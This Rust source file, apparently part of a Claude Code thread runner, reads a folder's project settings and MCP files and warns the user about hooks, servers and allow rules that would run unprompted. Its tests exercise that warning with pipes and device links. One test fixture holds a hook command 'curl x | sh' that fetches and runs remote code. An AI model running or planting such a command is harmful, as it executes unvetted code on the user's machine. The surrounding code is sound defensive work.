//! The notice of the folder of a new thread (THR-046, OD-THR21: project settings are honoured,
//! with a notice): what the project files of the folder make Claude Code do with no question, in
//! words for the person, before the first prompt goes. The reading of the files is here; what
//! they mean is in `agent_threads::project`.

use std::path::Path;

use agent_threads::project::{self, Found, Notice};

/// The lines of the notice of `folder`; none when its files make the program do nothing by
/// itself.
#[must_use]
pub fn of_folder(folder: &Path) -> Vec<String> {
    let texts = project::FILES.map(|name| read_one(&folder.join(name)));
    let found = texts.each_ref().map(|text| match text {
        File::Absent => Found::Absent,
        File::Unreadable => Found::Unreadable,
        File::Text(text) => Found::Text(text),
    });
    lines(&Notice::of(found))
}

/// One project file as it was read.
enum File {
    Absent,
    /// There, and it cannot be read or is longer than `project::MAX_FILE`.
    Unreadable,
    Text(String),
}

/// Reads one project file. A link is followed, as Claude Code follows it; but a pipe, a device or
/// a socket is never opened to wait on and never read, and a file is read to its limit only, so a
/// hostile folder cannot stop or fill the runner.
fn read_one(path: &Path) -> File {
    use std::io::Read as _;
    use std::os::unix::fs::OpenOptionsExt as _;
    let flags = rustix::fs::OFlags::NONBLOCK | rustix::fs::OFlags::NOCTTY;
    let opened = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(flags.bits().cast_signed())
        .open(path);
    let file = match opened {
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return File::Absent,
        Err(_) => return File::Unreadable,
        Ok(file) => file,
    };
    if !file.metadata().is_ok_and(|meta| meta.is_file()) {
        return File::Unreadable;
    }
    let limit = u64::try_from(project::MAX_FILE).unwrap_or(u64::MAX);
    let mut bytes = Vec::new();
    match file.take(limit + 1).read_to_end(&mut bytes) {
        Ok(read) if u64::try_from(read).unwrap_or(u64::MAX) <= limit => {
            String::from_utf8(bytes).map_or(File::Unreadable, File::Text)
        }
        _ => File::Unreadable,
    }
}

/// The notice in words. The first line says that only the files of Claude Code are read.
#[must_use]
pub fn lines(notice: &Notice) -> Vec<String> {
    if notice.is_empty() {
        return Vec::new();
    }
    let mut lines = vec![
        "The project files of this folder make Claude Code do these things with no question \
         (the project files of Codex are not read):"
            .to_owned(),
    ];
    lines.extend(
        notice
            .hooks
            .iter()
            .map(|hook| format!("Runs the command `{}` at {}.", hook.command, hook.event)),
    );
    if !notice.servers.is_empty() {
        lines.push(format!(
            "Starts the MCP servers {}.",
            notice.servers.join(", ")
        ));
    }
    if notice.allow_rules > 0 {
        lines.push(format!(
            "Has {} rules that allow a tool with no question.",
            notice.allow_rules
        ));
    }
    if !notice.environment.is_empty() {
        lines.push(format!(
            "Sets the environment names {}.",
            notice.environment.join(", ")
        ));
    }
    if notice.more > 0 {
        lines.push(format!("And {} more commands or servers.", notice.more));
    }
    lines.extend(
        notice
            .unreadable
            .iter()
            .map(|file| format!("Could not read {file}: it can hold commands that run.")),
    );
    lines
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn thr_046_a_folder_with_a_hook_gets_a_notice_that_names_its_command() {
        let folder = tempfile::tempdir().expect("a folder");
        assert!(of_folder(folder.path()).is_empty(), "no files, no notice");
        std::fs::create_dir(folder.path().join(".claude")).expect("the folder of Claude");
        std::fs::write(
            folder.path().join(".claude/settings.json"),
            r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}"#,
        )
        .expect("settings");
        std::fs::write(folder.path().join(".mcp.json"), "not json").expect("servers");
        let notice = of_folder(folder.path());
        assert!(notice[0].contains("Claude Code"));
        assert!(notice.contains(&"Runs the command `curl x | sh` at SessionStart.".to_owned()));
        assert!(
            notice
                .iter()
                .any(|line| line.starts_with("Could not read .mcp.json"))
        );
    }

    #[test]
    fn thr_046_a_pipe_or_a_device_as_a_project_file_is_unreadable_and_does_not_wait() {
        let folder = tempfile::tempdir().expect("a folder");
        std::fs::create_dir(folder.path().join(".claude")).expect("the folder of Claude");
        let pipe = folder.path().join(".claude/settings.json");
        let made = std::process::Command::new("mkfifo")
            .arg(&pipe)
            .status()
            .expect("mkfifo runs");
        assert!(made.success(), "a pipe");
        std::os::unix::fs::symlink("/dev/zero", folder.path().join(".mcp.json")).expect("a link");
        let notice = of_folder(folder.path());
        assert_eq!(
            notice
                .iter()
                .filter(|line| line.starts_with("Could not read"))
                .count(),
            2,
            "{notice:?}"
        );
    }
}
